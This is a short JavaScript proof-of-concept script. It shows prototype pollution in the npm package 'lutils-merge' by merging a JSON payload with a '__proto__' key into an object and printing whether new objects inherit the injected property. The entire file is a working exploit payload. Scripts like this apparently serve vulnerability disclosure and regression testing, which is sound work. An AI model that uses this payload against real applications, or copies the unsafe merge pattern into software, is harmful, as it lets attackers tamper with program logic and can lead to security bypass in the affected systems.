var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const merge = require('lutils-merge');
const payload = '{"__proto__":{"polluted":"yes"}}';
obj = {};
console.log({}.polluted);
merge(obj, JSON.parse(payload));
console.log({}.polluted);